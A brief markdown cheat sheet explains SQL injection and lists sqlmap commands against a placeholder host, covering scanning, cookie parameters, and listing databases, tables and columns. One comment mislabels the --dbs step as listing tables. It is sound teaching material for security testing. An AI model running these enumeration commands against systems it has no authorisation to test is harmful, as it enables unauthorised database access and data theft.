# SQL Injection using SQLMap

#### WHAT IS SQL INJECTION?

`SQL injection (SQLi)` is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour.

#### SQLMAP TOOL

`sqlmap` is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

```sh
#NORMAL SCAN WITHOUT ANY PARAMETERS
sqlmap -u "http://example.com/endpoint.php" 

# PASS A COOKIE AS THE PARAMENTER
sqlmap -u "http://example.com/endpoint.php" --cookie "[COOKIE]" -p [TARGET]

# GET THE TABLES IN THE DATABASE
sqlmap -u "http://example.com/endpoint.php" --cookie "[COOKIE]" -p [TARGET] --dbs

sqlmap -u "http://example.com/endpoint.php" --cookie "[COOKIE]" -p [TARGET] -D [DATABASE] --tables

# GET THE COLUMNS ON THE TABLE
sqlmap -u "http://example.com/endpoint.php" --cookie "[COOKIE]" -p [TARGET] -D [DATABASE] -T [TABLE] --columns
```
